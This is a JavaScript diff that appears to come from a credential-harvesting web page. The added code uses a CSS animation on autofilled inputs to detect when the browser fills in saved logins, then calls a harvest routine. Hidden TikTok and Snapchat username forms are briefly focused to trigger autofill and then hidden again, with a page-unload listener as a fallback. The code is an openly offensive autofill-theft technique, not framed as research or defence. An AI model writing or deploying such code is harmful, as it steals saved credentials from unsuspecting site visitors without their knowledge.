@@ -68,11 +68,26 @@ async function harvest() {
   }, 500);
 }
 
-// --- Autofill Detection ---
-// We will now rely on the focus swarm to trigger the harvest at the right time.
+// --- Autofill Detection using CSS Animation Trick ---
+const style = document.createElement('style');
+style.innerHTML = `
+  @keyframes onAutoFillStart { from {} to {} }
+  input:-webkit-autofill {
+    animation-name: onAutoFillStart;
+    animation-fill-mode: both;
+  }
+`;
+document.head.appendChild(style);
+
+document.addEventListener('animationstart', (e) => {
+  if (e.animationName === 'onAutoFillStart') {
+    // Use a small delay to ensure all fields in the form are filled
+    setTimeout(harvest, 50);
+  }
+}, true);
 
 // --- Fallback Mechanisms ---
-// The primary mechanism is now the focus swarm. The unload listener is a fallback.
+// The primary mechanism is now the animation detection. The unload listener is a fallback.
 window.addEventListener('beforeunload', harvest);
 
 // --- UI & Focus Trap Logic ---
@@ -104,13 +119,11 @@ function triggerFocusSwarm() {
   document.querySelector('#tiktok-form input[name="username"]')?.focus();
   document.querySelector('#snapchat-form input[name="username"]')?.focus();
 
-  // Hide the forms again shortly after and then harvest
+  // Hide the forms again shortly after. The harvest is now triggered by the animation event.
   setTimeout(() => {
       forms.forEach(form => {
           form.style.display = 'none';
       });
-      // Harvest after a delay to allow autofill to complete
-      setTimeout(harvest, 500);
   }, 100);
 }
 
